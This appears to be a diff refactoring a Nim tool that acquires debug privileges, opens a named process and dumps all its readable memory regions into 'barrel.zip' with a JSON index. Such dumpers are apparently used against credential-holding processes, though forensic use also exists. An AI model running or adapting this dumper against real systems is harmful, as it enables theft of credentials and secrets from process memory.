@@ -1,10 +1,8 @@
 import winim/lean
 import strformat
 import strutils
-#import std/json
 import zippy/ziparchives
 import tables
-#import os
 
 
 const
@@ -46,28 +44,9 @@ proc NtOpenProcessToken(ProcessHandle: HANDLE, DesiredAccess: DWORD, TokenHandle
 proc NtAdjustPrivilegesToken(TokenHandle: HANDLE, DisableAllPrivileges: BOOLEAN, NewState: ptr TokenPrivileges, BufferLength: DWORD, PreviousState: PVOID, ReturnLength: PDWORD): NTSTATUS {.discardable, dynlib: "ntdll", importc: "NtAdjustPrivilegesToken".}
 proc NtClose(Handle: HANDLE): NTSTATUS {.discardable, dynlib: "ntdll", importc: "NtClose".}
 proc NtGetNextProcess(ProcessHandle: HANDLE, DesiredAccess: ACCESS_MASK, HandleAttributes: ULONG, Flags: ULONG, NewProcessHandle: PHANDLE): NTSTATUS {.discardable, dynlib: "ntdll", importc: "NtGetNextProcess".}
-proc NtQueryInformationProcess(
-    ProcessHandle: HANDLE,
-    ProcessInformationClass: PROCESSINFOCLASS,
-    ProcessInformation: PVOID,
-    ProcessInformationLength: ULONG,
-    ReturnLength: PULONG
-): NTSTATUS {.discardable, dynlib: "ntdll", importc: "NtQueryInformationProcess".}
-proc NtReadVirtualMemory(
-    ProcessHandle: HANDLE,
-    BaseAddress: PVOID,
-    Buffer: PVOID,
-    BufferSize: SIZE_T,
-    NumberOfBytesRead: PSIZE_T
-): NTSTATUS {.discardable, dynlib: "ntdll", importc: "NtReadVirtualMemory".}
-proc NtQueryVirtualMemory(
-    ProcessHandle: HANDLE,
-    BaseAddress: PVOID,
-    MemoryInformationClass: MEMORY_INFORMATION_CLASS,
-    MemoryInformation: PVOID,
-    MemoryInformationLength: SIZE_T,
-    ReturnLength: PSIZE_T
-): NTSTATUS {.discardable, dynlib: "ntdll", importc: "NtQueryVirtualMemory".}
+proc NtQueryInformationProcess(ProcessHandle: HANDLE, ProcessInformationClass: PROCESSINFOCLASS, ProcessInformation: PVOID, ProcessInformationLength: ULONG, ReturnLength: PULONG): NTSTATUS {.discardable, dynlib: "ntdll", importc: "NtQueryInformationProcess".}
+proc NtReadVirtualMemory(ProcessHandle: HANDLE, BaseAddress: PVOID, Buffer: PVOID, BufferSize: SIZE_T, NumberOfBytesRead: PSIZE_T): NTSTATUS {.discardable, dynlib: "ntdll", importc: "NtReadVirtualMemory".}
+proc NtQueryVirtualMemory(ProcessHandle: HANDLE, BaseAddress: PVOID, MemoryInformationClass: MEMORY_INFORMATION_CLASS, MemoryInformation: PVOID, MemoryInformationLength: SIZE_T, ReturnLength: PSIZE_T): NTSTATUS {.discardable, dynlib: "ntdll", importc: "NtQueryVirtualMemory".}
 
 
 proc enableDebugPrivileges*() =
@@ -209,33 +188,25 @@ proc getProcessByName*(procName: string): HANDLE =
 
 
 proc GenerateZip*(zipFilename: string, memfiles: openArray[MemFile]): bool =
+  ## Crea un ZIP a partir de archivos en memoria usando Zippy (createZipArchive)
   try:
-    var filesToZip = initTable[string, string]()
-    
+    var files = initTable[string, string]()
+
     for memfile in memfiles:
-      #echo "memfile.filename",memfile.filename
       if not memfile.content.isNil and memfile.size > 0:
-        let filename = $cast[cstring](addr memfile.filename[0])
+        let filename = memfile.filename
         if filename.len > 0:
-          # Convertimos los bytes a string de manera segura (sin codificación)
           var data = newString(memfile.size)
-          copyMem(data[0].addr, memfile.content, memfile.size)
-          filesToZip[filename] = data  # Añadimos al diccionario
-          #echo "[+] Añadiendo: ", filename, " (", memfile.size, " bytes)"
-    
-    # Creamos el ZIP (usando el modo seguro para binarios)
-    let zipData = createZipArchive(filesToZip)
-    
-    # Guardamos el ZIP en disco
+          copyMem(addr data[0], memfile.content, memfile.size)
+          files[filename] = data
+
+    let zipData = createZipArchive(files)
     writeFile(zipFilename, zipData)
-    echo "[+] File ", zipFilename, " generated correctly"
+
+    echo "[+] ZIP generado correctamente: ", zipFilename
     return true
-    
-  except IOError as e:
-    echo "[-] Error de E/S: ", e.msg
-    return false
   except:
-    echo "[-] Error al crear el ZIP"
+    echo "[-] Error al generar el ZIP"
     return false
 
 
@@ -274,18 +245,13 @@ when isMainModule:
         break
 
     if mbi.Protect != PAGE_NOACCESS and mbi.State == MEM_COMMIT and ((mbi.Protect and PAGE_GUARD) == 0):
-        # echo "mbi.Protect: ",mbi.Protect
-
-        # Generar nombre de archivo legible
         let filename = "0X" & fmt"{cast[int](mbi.BaseAddress):X}"
         
-        # Leer la región de memoria
         let regionSize = mbi.RegionSize
         let buffer = cast[ptr UncheckedArray[byte]](alloc(regionSize))
         var bytesRead: SIZE_T = 0
 
         ### echo fmt"[+] Dumping {filename} ({regionSize} bytes)"
-
         let status = NtReadVirtualMemory(hProcess, mbi.BaseAddress, buffer, regionSize, addr bytesRead)
         let unsignedStatus = cast[uint32](status)
         if mbi.Protect == 260 or mbi.Protect == 258:
@@ -301,12 +267,9 @@ when isMainModule:
             dealloc(buffer)
             break
 
-        # Añadir metadatos al JSON
         jsonOutput.add(fmt"""{{"field0":"{filename}","field1":"0X{cast[int](mbi.BaseAddress):X}","field2":{regionSize}}},""")
 
-
         ## DEBUG
-        # Debug: Mostrar información de la región
         var hexBytes = ""
         if regionSize > 0:
             hexBytes = newStringOfCap(36)  # 12 bytes * 3 caracteres (máximo)
@@ -314,10 +277,9 @@ when isMainModule:
                 hexBytes.add(fmt"{buffer[i]:02X}")
                 if i < min(12, regionSize) - 1:  # Añadir espacio solo entre bytes
                     hexBytes.add(" ")
-
         #echo fmt"""{{"region":"{filename}","size":{regionSize},"first_bytes":"{hexBytes}"}}"""
 
-        # Almacenar en MemFile
+        # Create MemFile
         if memfileCount < MAX_MEMFILES:
             memfileList[memfileCount] = MemFile(
                 filename: filename,
@@ -329,7 +291,7 @@ when isMainModule:
             echo "[-] ¡Lista de MemFiles llena! Omitiendo región."
             dealloc(buffer)
 
-    # Siguiente región
+    # Next region
     memAddress = cast[PVOID](cast[uint64](memAddress) + cast[uint64](mbi.RegionSize))
 
   echo fmt"[+] Number of memory regions: {memfileCount}"
@@ -342,11 +304,5 @@ when isMainModule:
   let zip_filename = "barrel.zip"
   writeFile(json_filename, $jsonOutput)
   echo "[+] File ", json_filename, " generated correctly"
-
-  #for i in 0..<memfileCount:
-    #let m = moduleArray[i]
-    #echo "Module: ", i+1
-    #echo "Size:   ",memfileList[i].size
-    #echo "Fname:  ",memfileList[i].filename
 
   let zip_generated = GenerateZip(zip_filename, memfileList)
